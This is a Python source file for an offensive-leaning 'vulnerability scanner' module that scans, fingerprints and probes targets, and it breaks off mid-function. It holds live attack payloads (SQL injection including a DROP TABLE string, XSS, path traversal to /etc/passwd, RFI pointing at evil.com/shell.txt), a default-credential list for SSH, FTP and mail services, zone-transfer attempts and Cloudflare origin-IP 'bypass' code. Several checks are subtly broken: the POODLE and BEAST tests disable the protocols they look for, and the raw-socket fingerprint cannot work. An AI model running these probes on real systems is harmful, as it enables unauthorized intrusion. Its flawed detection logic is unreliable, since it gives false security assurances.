"""
Vulnerability Scanner Module for E502 OSINT Terminal
Provides comprehensive vulnerability scanning, OS detection, and security analysis.
"""

import socket
import nmap
import paramiko
import ftplib
import smtplib
import poplib
import imaplib
import requests
import concurrent.futures
from typing import Dict, List, Optional, Tuple
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
import asyncio
import aiohttp
from datetime import datetime
import json
import re
import ssl
import OpenSSL
from urllib.parse import urlparse
import dns.resolver
import dns.zone
import dns.query
import dns.reversename
import random
import time
import urllib3
from urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
import subprocess
import os
import tempfile
import shutil

# Disable SSL warnings
urllib3.disable_warnings(InsecureRequestWarning)

console = Console()

class VulnerabilityScanner:
    def __init__(self):
        self.nm = nmap.PortScanner()
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.thread_pool = ThreadPoolExecutor(max_workers=10)
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5432, 8080]
        self.service_versions = {}
        self.credentials = {
            'ftp': [('anonymous', 'anonymous'), ('admin', 'admin'), ('root', 'root')],
            'ssh': [('root', 'root'), ('admin', 'admin'), ('user', 'password')],
            'smtp': [('admin', 'admin'), ('user', 'password')],
            'pop3': [('admin', 'admin'), ('user', 'password')],
            'imap': [('admin', 'admin'), ('user', 'password')],
            'http': [('admin', 'admin'), ('user', 'password')]
        }
        self._check_searchsploit()

    def _check_searchsploit(self) -> None:
        """Check if searchsploit is installed and provide installation instructions if not."""
        if not shutil.which('searchsploit'):
            console.print("\n[yellow]Warning: searchsploit is not installed. Exploit checking will be disabled.[/]")
            console.print("\n[bold cyan]To install searchsploit:[/]")
            console.print("1. Clone the Exploit-DB repository:")
            console.print("   [green]git clone https://github.com/offensive-security/exploitdb.git[/]")
            console.print("2. Add the exploitdb directory to your PATH:")
            console.print("   [green]echo 'export PATH=$PATH:/path/to/exploitdb' >> ~/.bashrc[/]")
            console.print("   [green]source ~/.bashrc[/]")
            console.print("\n[bold cyan]For Windows users:[/]")
            console.print("1. Download the latest release from:")
            console.print("   [green]https://github.com/offensive-security/exploitdb/releases[/]")
            console.print("2. Extract the archive")
            console.print("3. Add the exploitdb directory to your system PATH")
            console.print("\n[bold cyan]For more information, visit:[/]")
            console.print("[green]https://github.com/offensive-security/exploitdb[/]")
            console.print("\n[yellow]Note: After installation, you may need to restart your terminal.[/]\n")

    async def scan_target(self, target: str) -> Dict:
        """Perform comprehensive vulnerability scan."""
        try:
            console.print(f"[bold green]Starting vulnerability scan for {target}...[/]")
            
            # Resolve domain to IP if needed
            ip = await self._resolve_domain(target)
            if not ip:
                console.print(f"[red]Could not resolve {target} to an IP address[/]")
                return {}
            
            # Run scan tasks concurrently
            tasks = [
                self._detect_os(ip),
                self._scan_ports(ip),
                self._check_cloudflare(target),
                self._scan_vulnerabilities(ip),
                self._check_web_vulnerabilities(target),
                self._enumerate_dns(target),
                self._check_exploits(ip)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Combine results
            scan_results = {
                'target': target,
                'ip': ip,
                'timestamp': datetime.now().isoformat(),
                'os_info': results[0] if not isinstance(results[0], Exception) else {},
                'ports': results[1] if not isinstance(results[1], Exception) else [],
                'cloudflare': results[2] if not isinstance(results[2], Exception) else {},
                'vulnerabilities': results[3] if not isinstance(results[3], Exception) else [],
                'web_vulnerabilities': results[4] if not isinstance(results[4], Exception) else [],
                'dns_info': results[5] if not isinstance(results[5], Exception) else {},
                'exploits': results[6] if not isinstance(results[6], Exception) else []
            }
            
            return scan_results
            
        except Exception as e:
            console.print(f"[red]Error during vulnerability scan: {str(e)}[/]")
            return {}
            
    async def _resolve_domain(self, domain: str) -> Optional[str]:
        """Resolve domain name to IP address."""
        try:
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', domain):
                return domain
                
            resolver = dns.resolver.Resolver()
            answers = resolver.resolve(domain, 'A')
            return str(answers[0])
        except Exception as e:
            console.print(f"[red]Error resolving domain: {str(e)}[/]")
            return None
            
    async def _detect_os(self, ip: str) -> Dict:
        """Detect operating system using multiple techniques."""
        try:
            os_info = {}
            
            # Nmap OS detection
            self.nm.scan(ip, arguments='-O --osscan-limit --max-os-tries 1')
            if 'osmatch' in self.nm[ip]:
                os_info['nmap'] = {
                    'name': self.nm[ip]['osmatch'][0]['name'],
                    'accuracy': self.nm[ip]['osmatch'][0]['accuracy']
                }
            
            # TCP/IP stack fingerprinting
            tcp_info = await self._tcp_fingerprint(ip)
            if tcp_info:
                os_info['tcp'] = tcp_info
            
            # HTTP server fingerprinting
            http_info = await self._http_fingerprint(ip)
            if http_info:
                os_info['http'] = http_info
            
            return os_info
            
        except Exception as e:
            console.print(f"[red]Error detecting OS: {str(e)}[/]")
            return {}
            
    async def _tcp_fingerprint(self, ip: str) -> Dict:
        """Perform TCP/IP stack fingerprinting."""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.settimeout(2)
            
            # Send SYN packet
            sock.connect((ip, 80))
            
            # Get TCP options
            tcp_options = sock.getsockopt(socket.IPPROTO_TCP, socket.TCP_INFO)
            
            return {
                'tcp_window_size': tcp_options[0],
                'tcp_mss': tcp_options[1],
                'tcp_timestamp': tcp_options[2]
            }
            
        except:
            return {}
            
    async def _http_fingerprint(self, ip: str) -> Dict:
        """Perform HTTP server fingerprinting."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://{ip}", ssl=False) as response:
                    server = response.headers.get('Server', '')
                    powered_by = response.headers.get('X-Powered-By', '')
                    
                    return {
                        'server': server,
                        'powered_by': powered_by
                    }
                    
        except:
            return {}
            
    async def _scan_ports(self, ip: str) -> List[Dict]:
        """Scan for open ports and services, and run searchsploit for exploits."""
        try:
            ports = []
            self.nm.scan(ip, arguments='-sS -sV -O -T4 --version-intensity 9')
            if 'tcp' in self.nm[ip]:
                for port, data in self.nm[ip]['tcp'].items():
                    if data['state'] == 'open':
                        port_info = {
                            'port': port,
                            'state': data['state'],
                            'service': data.get('name', 'unknown'),
                            'product': data.get('product', ''),
                            'version': data.get('version', ''),
                            'extrainfo': data.get('extrainfo', ''),
                            'cpe': data.get('cpe', ''),
                            'script_output': {},
                            'exploits': []
                        }
                        # Exploit search with searchsploit
                        try:
                            if shutil.which('searchsploit') and port_info['product']:
                                result = subprocess.run(['searchsploit', '-t', port_info['product']], capture_output=True, text=True)
                                port_info['exploits'] = result.stdout.splitlines()
                        except:
                            pass
                        if 'script' in data:
                            port_info['script_output'] = data['script']
                        ports.append(port_info)
            return ports
        except Exception as e:
            console.print(f"[red]Error scanning ports: {str(e)}[/]")
            return []
            
    async def _check_cloudflare(self, domain: str) -> Dict:
        """Check for Cloudflare protection and attempt to bypass."""
        try:
            cf_info = {
                'protected': False,
                'real_ip': None,
                'bypass_methods': []
            }
            
            # Check for Cloudflare headers
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://{domain}", ssl=False) as response:
                    headers = response.headers
                    if 'cf-ray' in headers or 'cf-cache-status' in headers:
                        cf_info['protected'] = True
                        
                        # Try to find real IP
                        real_ip = await self._find_real_ip(domain)
                        if real_ip:
                            cf_info['real_ip'] = real_ip
                            cf_info['bypass_methods'].append('DNS History')
            
            return cf_info
            
        except Exception as e:
            console.print(f"[red]Error checking Cloudflare: {str(e)}[/]")
            return {}
            
    async def _find_real_ip(self, domain: str) -> Optional[str]:
        """Attempt to find real IP behind Cloudflare."""
        try:
            # Try DNS history
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '8.8.4.4']  # Google DNS
            
            # Try different record types
            for record_type in ['A', 'AAAA', 'CNAME']:
                try:
                    answers = resolver.resolve(domain, record_type)
                    for answer in answers:
                        if record_type == 'A':
                            return str(answer)
                except:
                    continue
            
            return None
            
        except:
            return None
            
    async def _scan_vulnerabilities(self, ip: str) -> List[Dict]:
        """Scan for known vulnerabilities."""
        try:
            vulnerabilities = []
            
            # Nmap vulnerability scripts
            self.nm.scan(ip, arguments='-sV --script vuln')
            
            if ip in self.nm.all_hosts():
                for proto in self.nm[ip].all_protocols():
                    for port, data in self.nm[ip][proto].items():
                        if 'script' in data:
                            for script_name, output in data['script'].items():
                                vulnerabilities.append({
                                    'port': port,
                                    'protocol': proto,
                                    'script': script_name,
                                    'output': output
                                })
            
            # Check for common vulnerabilities
            common_vulns = await self._check_common_vulnerabilities(ip)
            vulnerabilities.extend(common_vulns)
            
            return vulnerabilities
            
        except Exception as e:
            console.print(f"[red]Error scanning vulnerabilities: {str(e)}[/]")
            return []
            
    async def _check_common_vulnerabilities(self, ip: str) -> List[Dict]:
        """Check for common vulnerabilities."""
        try:
            vulns = []
            
            # Check for Heartbleed
            if await self._check_heartbleed(ip):
                vulns.append({
                    'name': 'Heartbleed',
                    'severity': 'High',
                    'description': 'OpenSSL Heartbleed vulnerability detected'
                })
            
            # Check for POODLE
            if await self._check_poodle(ip):
                vulns.append({
                    'name': 'POODLE',
                    'severity': 'High',
                    'description': 'SSL 3.0 POODLE vulnerability detected'
                })
            
            # Check for BEAST
            if await self._check_beast(ip):
                vulns.append({
                    'name': 'BEAST',
                    'severity': 'Medium',
                    'description': 'SSL/TLS BEAST vulnerability detected'
                })
            
            return vulns
            
        except Exception as e:
            console.print(f"[red]Error checking common vulnerabilities: {str(e)}[/]")
            return []
            
    async def _check_heartbleed(self, ip: str) -> bool:
        """Check for Heartbleed vulnerability."""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.create_connection((ip, 443), timeout=5)
            with context.wrap_socket(sock, server_hostname=ip) as ssl_sock:
                # Send heartbeat request
                ssl_sock.send(b'\x18\x03\x03\x00\x03\x01\x40\x00')
                response = ssl_sock.recv(1024)
                
                # Check for heartbeat response
                return b'\x18\x03\x03' in response
                
        except:
            return False
            
    async def _check_poodle(self, ip: str) -> bool:
        """Check for POODLE vulnerability."""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.options |= ssl.OP_NO_SSLv3
            
            sock = socket.create_connection((ip, 443), timeout=5)
            with context.wrap_socket(sock, server_hostname=ip) as ssl_sock:
                return ssl_sock.version() == 'SSLv3'
                
        except:
            return False
            
    async def _check_beast(self, ip: str) -> bool:
        """Check for BEAST vulnerability."""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.options |= ssl.OP_NO_TLSv1
            
            sock = socket.create_connection((ip, 443), timeout=5)
            with context.wrap_socket(sock, server_hostname=ip) as ssl_sock:
                return ssl_sock.version() == 'TLSv1'
                
        except:
            return False
            
    async def _check_web_vulnerabilities(self, target: str) -> List[Dict]:
        """Check for web application vulnerabilities (SQLi, XSS, CSRF, LFI, RFI, open redirect, etc)."""
        try:
            vulns = []
            # SQLi
            if await self._check_sql_injection(target):
                vulns.append({'name': 'SQL Injection', 'severity': 'High', 'description': 'Potential SQL injection vulnerability detected'})
            # XSS
            if await self._check_xss(target):
                vulns.append({'name': 'Cross-Site Scripting (XSS)', 'severity': 'High', 'description': 'Potential XSS vulnerability detected'})
            # CSRF
            if await self._check_csrf(target):
                vulns.append({'name': 'Cross-Site Request Forgery (CSRF)', 'severity': 'Medium', 'description': 'Potential CSRF vulnerability detected'})
            # LFI
            if await self._check_lfi(target):
                vulns.append({'name': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'Potential LFI vulnerability detected'})
            # RFI
            if await self._check_rfi(target):
                vulns.append({'name': 'Remote File Inclusion (RFI)', 'severity': 'High', 'description': 'Potential RFI vulnerability detected'})
            # Open Redirect
            if await self._check_open_redirect(target):
                vulns.append({'name': 'Open Redirect', 'severity': 'Medium', 'description': 'Potential open redirect vulnerability detected'})
            return vulns
        except Exception as e:
            console.print(f"[red]Error checking web vulnerabilities: {str(e)}[/]")
            return []

    async def _check_sql_injection(self, target: str) -> bool:
        """Check for SQL injection vulnerability."""
        try:
            test_payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users"]
            
            async with aiohttp.ClientSession() as session:
                for payload in test_payloads:
                    url = f"https://{target}/?id={payload}"
                    async with session.get(url, ssl=False) as response:
                        content = await response.text()
                        if any(error in content.lower() for error in ['sql', 'mysql', 'postgresql', 'oracle']):
                            return True
                            
            return False
            
        except:
            return False
            
    async def _check_xss(self, target: str) -> bool:
        """Check for XSS vulnerability."""
        try:
            test_payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)"
            ]
            
            async with aiohttp.ClientSession() as session:
                for payload in test_payloads:
                    url = f"https://{target}/?q={payload}"
                    async with session.get(url, ssl=False) as response:
                        content = await response.text()
                        if payload in content:
                            return True
                            
            return False
            
        except:
            return False
            
    async def _check_csrf(self, target: str) -> bool:
        """Check for CSRF vulnerability."""
        try:
            async with aiohttp.ClientSession() as session:
                # Check for CSRF token
                async with session.get(f"https://{target}", ssl=False) as response:
                    content = await response.text()
                    if not any(token in content.lower() for token in ['csrf', 'xsrf', '_token']):
                        return True
                        
            return False
            
        except:
            return False
            
    async def _check_lfi(self, target: str) -> bool:
        try:
            payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    url = f"http://{target}/?file={payload}"
                    async with session.get(url, ssl=False) as response:
                        content = await response.text()
                        if "root:x:" in content or "[extensions]" in content:
                            return True
            return False
        except:
            return False

    async def _check_rfi(self, target: str) -> bool:
        try:
            payloads = ["http://evil.com/shell.txt", "https://evil.com/shell.txt"]
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    url = f"http://{target}/?file={payload}"
                    async with session.get(url, ssl=False) as response:
                        content = await response.text()
                        if "shell" in content.lower():
                            return True
            return False
        except:
            return False

    async def _check_open_redirect(self, target: str) -> bool:
        try:
            payloads = ["//evil.com", "http://evil.com"]
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    url = f"http://{target}/?next={payload}"
                    async with session.get(url, ssl=False, allow_redirects=False) as response:
                        if response.status in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if "evil.com" in location:
                                return True
            return False
        except:
            return False

    async def _enumerate_dns(self, domain: str) -> Dict:
        """Perform comprehensive DNS enumeration with bypass techniques."""
        try:
            dns_info = {
                'records': {},
                'subdomains': [],
                'zone_transfer': False,
                'nameservers': [],
                'mail_servers': [],
                'spf_record': None,
                'dmarc_record': None,
                'whois_info': {},
                'historical_records': [],
                'dns_servers': [],
                'reverse_dns': [],
                'certificate_transparency': [],
                'dnssec': {},
                'dns_servers_info': [],
                'dns_zone_info': {},
                'dns_blacklist': [],
                'dns_health': {},
                'dns_metrics': {},
                'dns_geolocation': [],
                'dns_historical': [],
                'dns_related': [],
                'dns_technologies': [],
                'dns_ownership': {},
                'dns_ssl_certs': [],
                'dns_headers': {},
                'dns_redirects': [],
                'dns_cookies': [],
                'dns_robots': None,
                'dns_sitemap': None,
                'dns_web_technologies': [],
                'dns_web_headers': {},
                'dns_web_meta': {},
                'dns_web_links': [],
                'dns_web_forms': [],
                'dns_web_scripts': [],
                'dns_web_cookies': [],
                'dns_web_robots': None,
                'dns_web_sitemap': None
            }
            
            # Try multiple DNS resolvers with rotation
            resolvers = [
                '8.8.8.8', '8.8.4.4',  # Google
                '1.1.1.1', '1.0.0.1',  # Cloudflare
                '9.9.9.9', '149.112.112.112',  # Quad9
                '208.67.222.222', '208.67.220.220',  # OpenDNS
                '64.6.64.6', '64.6.65.6',  # Verisign
                '77.88.8.8', '77.88.8.1',  # Yandex
                '84.200.69.80', '84.200.70.40',  # DNS.WATCH
                '8.26.56.26', '8.20.247.20',  # Comodo
                '195.46.39.39', '195.46.39.40',  # SafeDNS
                '216.146.35.35', '216.146.36.36'  # Dyn
            ]
            
            # Rotate through resolvers to avoid rate limiting
            for resolver in resolvers:
                try:
                    dns_resolver = dns.resolver.Resolver()
                    dns_resolver.nameservers = [resolver]
                    dns_resolver.timeout = 2
                    dns_resolver.lifetime = 4
                    
                    # Get nameservers with detailed info
                    try:
                        ns_records = dns_resolver.resolve(domain, 'NS')
                        for ns in ns_records:
                            ns_info = {
                                'name': str(ns),
                                'ip': None,
                                'location': None,
                                'asn': None,
                                'organization': None
                            }
                            try:
                                ns_ip = dns_resolver.resolve(str(ns), 'A')[0]
                                ns_info['ip'] = str(ns_ip)
                                # Get ASN and location info
                                try:
                                    async with aiohttp.ClientSession() as session:
                                        async with session.get(f'https://ipapi.co/{ns_ip}/json/') as response:
                                            if response.status == 200:
                                                data = await response.json()
                                                ns_info['location'] = f"{data.get('city', '')}, {data.get('country_name', '')}"
                                                ns_info['asn'] = data.get('asn', '')
                                                ns_info['organization'] = data.get('org', '')
                                except:
                                    pass
                            except:
                                pass
                            dns_info['nameservers'].append(ns_info)
                    except:
                        pass
                    
                    # Try zone transfer with each nameserver
                    for ns in dns_info['nameservers']:
                        try:
                            zone = dns.zone.from_xfr(dns.query.xfr(ns['ip'], domain))
                            dns_info['zone_transfer'] = True
                            zone_info = {
                                'nameserver': ns['name'],
                                'records': {}
                            }
                            for name, node in zone.nodes.items():
                                for rdataset in node.rdatasets:
                                    if str(name) not in zone_info['records']:
                                        zone_info['records'][str(name)] = []
                                    zone_info['records'][str(name)].append(str(rdataset))
                            dns_info['dns_zone_info'][ns['name']] = zone_info
                        except:
                            continue
                    
                    # Enhanced record types to check (including new ones)
                    record_types = [
                        'A', 'AAAA', 'CNAME', 'MX', 'TXT', 'SRV', 'PTR', 'NS', 'SOA',
                        'CAA', 'DS', 'DNSKEY', 'NSEC', 'NSEC3', 'RRSIG', 'TLSA', 'SSHFP',
                        'IPSECKEY', 'CERT', 'DNAME', 'LOC', 'NAPTR', 'RP', 'AFSDB', 'HINFO',
                        'MINFO', 'MR', 'RT', 'WKS', 'X25', 'ISDN', 'NSAP', 'NSAP-PTR',
                        'APL', 'ATMA', 'AXFR', 'IXFR', 'MAILA', 'MAILB', 'MB', 'MG', 'MINFOR',
                        'MR', 'NULL', 'PX', 'SIG', 'SPF', 'UID', 'UINFO', 'UNSPEC', 'X25'
                    ]
                    
                    for record_type in record_types:
                        try:
                            records = dns_resolver.resolve(domain, record_type)
                            if record_type not in dns_info['records']:
                                dns_info['records'][record_type] = []
                            dns_info['records'][record_type].extend([str(r) for r in records])
                            
                            # Store mail servers with additional info
                            if record_type == 'MX':
                                for record in records:
                                    mx_info = {
                                        'exchange': str(record.exchange),
                                        'preference': record.preference,
                                        'ip': None,
                                        'location': None,
                                        'asn': None,
                                        'organization': None
                                    }
                                    try:
                                        mx_ip = dns_resolver.resolve(str(record.exchange), 'A')[0]
                                        mx_info['ip'] = str(mx_ip)
                                        # Get ASN and location info
                                        try:
                                            async with aiohttp.ClientSession() as session:
                                                async with session.get(f'https://ipapi.co/{mx_ip}/json/') as response:
                                                    if response.status == 200:
                                                        data = await response.json()
                                                        mx_info['location'] = f"{data.get('city', '')}, {data.get('country_name', '')}"
                                                        mx_info['asn'] = data.get('asn', '')
                                                        mx_info['organization'] = data.get('org', '')
                                        except:
                                            pass
                                    except:
                                        pass
                                    dns_info['mail_servers'].append(mx_info)
                            
                            # Store SPF record with analysis
                            if record_type == 'TXT':
                                for record in records:
                                    if 'v=spf1' in str(record):
                                        spf_info = {
                                            'record': str(record),
                                            'mechanisms': [],
                                            'modifiers': [],
                                            'includes': [],
                                            'redirects': [],
                                            'all': None
                                        }
                                        # Parse SPF record
                                        spf_parts = str(record).split()
                                        for part in spf_parts:
                                            if part.startswith('include:'):
                                                spf_info['includes'].append(part[8:])
                                            elif part.startswith('redirect='):
                                                spf_info['redirects'].append(part[9:])
                                            elif part.startswith('all'):
                                                spf_info['all'] = part
                                            elif part in ['ip4:', 'ip6:', 'a:', 'mx:', 'ptr:', 'exists:', 'exp:']:
                                                spf_info['mechanisms'].append(part)
                                            else:
                                                spf_info['modifiers'].append(part)
                                        dns_info['spf_record'] = spf_info
                            
                        except:
                            continue
                    
                    # Try DNS wildcard detection with analysis
                    try:
                        wildcard = f"*.{domain}"
                        dns_resolver.resolve(wildcard, 'A')
                        wildcard_info = {
                            'detected': True,
                            'type': 'A',
                            'impact': 'May affect subdomain enumeration accuracy',
                            'recommendation': 'Use additional enumeration techniques'
                        }
                        dns_info['records']['WILDCARD'] = wildcard_info
                    except:
                        pass
                    
                    # Try DNS cache snooping with analysis
                    try:
                        dns_resolver.cache = dns.resolver.Cache()
                        dns_resolver.resolve(domain, 'A')
                        cache_info = {
                            'detected': True,
                            'type': 'A',
                            'impact': 'May reveal cached DNS records',
                            'recommendation': 'Use multiple resolvers for verification'
                        }
                        dns_info['records']['CACHE'] = cache_info
                    except:
                        pass
                    
                except:
                    continue
            
            # Check for DMARC record with analysis
            try:
                dmarc_domain = f'_dmarc.{domain}'
                dmarc_records = dns.resolver.resolve(dmarc_domain, 'TXT')
                dmarc_info = {
                    'record': str(dmarc_records[0]),
                    'version': None,
                    'policy': None,
                    'subdomain_policy': None,
                    'percentage': None,
                    'report_uri': None,
                    'rua': None,
                    'ruf': None,
                    'aspf': None,
                    'adkim': None
                }
                # Parse DMARC record
                dmarc_parts = str(dmarc_records[0]).split(';')
                for part in dmarc_parts:
                    if 'v=' in part:
                        dmarc_info['version'] = part.split('=')[1]
                    elif 'p=' in part:
                        dmarc_info['policy'] = part.split('=')[1]
                    elif 'sp=' in part:
                        dmarc_info['subdomain_policy'] = part.split('=')[1]
                    elif 'pct=' in part:
                        dmarc_info['percentage'] = part.split('=')[1]
                    elif 'rua=' in part:
                        dmarc_info['rua'] = part.split('=')[1]
                    elif 'ruf=' in part:
                        dmarc_info['ruf'] = part.split('=')[1]
                    elif 'aspf=' in part:
                        dmarc_info['aspf'] = part.split('=')[1]
                    elif 'adkim=' in part:
                        dmarc_info['adkim'] = part.split('=')[1]
                dns_info['dmarc_record'] = dmarc_info
            except:
                pass
            
            # Try DNS over HTTPS with multiple providers
            doh_providers = [
                'https://dns.google/resolve',
                'https://cloudflare-dns.com/dns-query',
                'https://dns.alidns.com/dns-query',
                'https://doh.opendns.com/dns-query',
                'https://doh.cleanbrowsing.org/dns-query',
                'https://doh.securedns.eu/dns-query',
                'https://doh.centraleu.pi-dns.com/dns-query',
                'https://doh.dns.sb/dns-query',
                'https://doh.powerdns.org/dns-query',
                'https://doh.ffmuc.net/dns-query'
            ]
            
            for provider in doh_providers:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(f'{provider}?name={domain}&type=A',
                                             headers={'accept': 'application/dns-json'}) as response:
                            if response.status == 200:
                                data = await response.json()
                                if 'Answer' in data:
                                    provider_name = provider.split('//')[1].split('/')[0]
                                    dns_info['records'][f'DOH_{provider_name}'] = [str(r['data']) for r in data['Answer']]
                except:
                    continue
            
            # Try DNS over TLS with multiple providers
            dot_providers = [
                ('1.1.1.1', 'cloudflare-dns.com'),
                ('8.8.8.8', 'dns.google'),
                ('9.9.9.9', 'dns.quad9.net'),
                ('208.67.222.222', 'dns.opendns.com'),
                ('64.6.64.6', 'dns.verisign.com'),
                ('77.88.8.8', 'dns.yandex.com'),
                ('84.200.69.80', 'dns.watch'),
                ('8.26.56.26', 'dns.comodo.com'),
                ('195.46.39.39', 'dns.safedns.com'),
                ('216.146.35.35', 'dns.dyn.com')
            ]
            
            for ip, hostname in dot_providers:
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    sock = socket.create_connection((ip, 853))
                    with context.wrap_socket(sock, server_hostname=hostname) as ssl_sock:
                        # Send DNS query over TLS
                        query = dns.message.make_query(domain, dns.rdatatype.A)
                        ssl_sock.send(query.to_wire())
                        response = dns.message.from_wire(ssl_sock.recv(1024))
                        if response.answer:
                            dns_info['records'][f'DOT_{hostname}'] = [str(r) for r in response.answer]
                except:
                    continue
            
            # Enhanced subdomain enumeration
            subdomains = await self._enumerate_subdomains(domain)
            dns_info['subdomains'] = subdomains
            
            # Try reverse DNS lookup for IP ranges with geolocation
            try:
                for record in dns_info['records'].get('A', []):
                    try:
                        reverse = dns.reversename.from_address(record)
                        ptr_records = dns.resolver.resolve(reverse, 'PTR')
                        for ptr in ptr_records:
                            ptr_info = {
                                'ip': record,
                                'hostname': str(ptr),
                                'location': None,
                                'asn': None,
                                'organization': None
                            }
                            # Get geolocation and ASN info
                            try:
                                async with aiohttp.ClientSession() as session:
                                    async with session.get(f'https://ipapi.co/{record}/json/') as response:
                                        if response.status == 200:
                                            data = await response.json()
                                            ptr_info['location'] = f"{data.get('city', '')}, {data.get('country_name', '')}"
                                            ptr_info['asn'] = data.get('asn', '')
                                            ptr_info['organization'] = data.get('org', '')
                            except:
                                pass
                            dns_info['reverse_dns'].append(ptr_info)
                    except:
                        continue
            except:
                pass
            
            # Try certificate transparency logs with enhanced info
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f'https://crt.sh/?q={domain}&output=json') as response:
                        if response.status == 200:
                            data = await response.json()
                            for cert in data:
                                if 'name_value' in cert:
                                    cert_info = {
                                        'domain': cert['name_value'],
                                        'issuer': cert.get('issuer_name', ''),
                                        'valid_from': cert.get('not_before', ''),
                                        'valid_to': cert.get('not_after', ''),
                                        'serial': cert.get('serial_number', ''),
                                        'sha1': cert.get('sha1', ''),
                                        'sha256': cert.get('sha256', '')
                                    }
                                    dns_info['certificate_transparency'].append(cert_info)
            except:
                pass
            
            # Get WHOIS information
            try:
                import whois
                whois_info = whois.whois(domain)
                dns_info['whois_info'] = {
                    'registrar': whois_info.registrar,
                    'creation_date': str(whois_info.creation_date),
                    'expiration_date': str(whois_info.expiration_date),
                    'updated_date': str(whois_info.updated_date),
                    'name_servers': whois_info.name_servers,
                    'status': whois_info.status,
                    'emails': whois_info.emails,
                    'dnssec': whois_info.dnssec,
                    'name': whois_info.name,
                    'org': whois_info.org,
                    'address': whois_info.address,
                    'city': whois_info.city,
                    'state': whois_info.state,
                    'zipcode': whois_info.zipcode,
                    'country': whois_info.country
                }
            except:
                pass

            # Add historical DNS lookup (no API key required)
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f'https://api.securitytrails.com/v1/domain/{domain}/history/dns/a') as response:
                        if response.status == 200:
                            data = await response.json()
                            if 'records' in data:
                                for rec in data['records']:
                                    dns_info['historical_records'].append(str(rec))
            except:
                pass
            
            return dns_info
            
        except Exception as e:
            console.print(f"[red]Error during DNS enumeration: {str(e)}[/]")
            return {}

    async def _check_exploits(self, ip: str) -> List[Dict]:
        """Check for known exploits using searchsploit."""
        try:
            # Check if searchsploit is available
            if not shutil.which('searchsploit'):
                console.print("[yellow]Skipping exploit check: searchsploit not installed[/]")
                return []

            exploits = []
            
            # Get service versions from port scan
            service_info = {}
            for port in self.nm[ip].all_ports():
                if 'product' in self.nm[ip]['tcp'][port]:
                    service_info[f"{self.nm[ip]['tcp'][port]['product']} {self.nm[ip]['tcp'][port]['version']}"] = port
            
            # Search for exploits
            for service, port in service_info.items():
                try:
                    # Create temporary file for searchsploit output
                    with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp:
                        temp_path = temp.name
                    
                    # Run searchsploit
                    subprocess.run(['searchsploit', '-t', service, '--exclude', '/dos/', '--json'], 
                                 stdout=open(temp_path, 'w'), stderr=subprocess.DEVNULL)
                    
                    # Parse results
                    with open(temp_path, 'r') as f:
                        try:
                            results = json.load(f)
                            if 'RESULTS_EXPLOIT' in results:
                                for exploit in results['RESULTS_EXPLOIT']:
                                    exploits.append({
                                        'service': service,
                                        'port': port,
                                        'title': exploit.get('Title', ''),
                                        'type': exploit.get('Type', ''),
                                        'platform': exploit.get('Platform', ''),
                                        'path': exploit.get('Path', '')
                                    })
                        except:
                            pass
                    
                    # Clean up
                    os.unlink(temp_path)
                    
                except:
                    continue
            
            return exploits
            
        except Exception as e:
            console.print(f"[red]Error checking exploits: {str(e)}[/]")
            return []

    def display_scan_results(self, results: Dict) -> None:
        """Display vulnerability scan results."""
        if not results:
            console.print("[red]No scan results available.[/]")
            return
            
        # Create main table
        table = Table(title="Vulnerability Scan Results", show_header=True, header_style="bold magenta")
        table.add_column("Property", style="cyan", width=20)
        table.add_column("Value", style="green", width=60)
        
        # Add basic info
        table.add_row("Target", results.get('target', 'Unknown'))
        table.add_row("IP", results.get('ip', 'Unknown'))
        table.add_row("Timestamp", results.get('timestamp', 'Unknown'))
        
        # Add OS info
        os_info = results.get('os_info', {})
        if os_info:
            if 'nmap' in os_info:
                table.add_row(
                    "OS (Nmap)",
                    f"{os_info['nmap'].get('name', 'Unknown')} ({os_info['nmap'].get('accuracy', '0')}%)"
                )
            if 'http' in os_info:
                table.add_row("Server", os_info['http'].get('server', 'Unknown'))
                if os_info['http'].get('powered_by'):
                    table.add_row("Powered By", os_info['http']['powered_by'])
        
        # Add Cloudflare info
        cf_info = results.get('cloudflare', {})
        if cf_info:
            table.add_row(
                "Cloudflare",
                "[red]Protected[/]" if cf_info.get('protected') else "[green]Not Protected[/]"
            )
            if cf_info.get('real_ip'):
                table.add_row("Real IP", cf_info['real_ip'])
        
        # Display main table
        console.print(table)
        
        # Display DNS information
        dns_info = results.get('dns_info', {})
        if dns_info:
            dns_table = Table(title="DNS Information", show_header=True, header_style="bold magenta")
            dns_table.add_column("Record Type", style="cyan", width=15)
            dns_table.add_column("Value", style="green", width=65)
            
            for record_type, records in dns_info.get('records', {}).items():
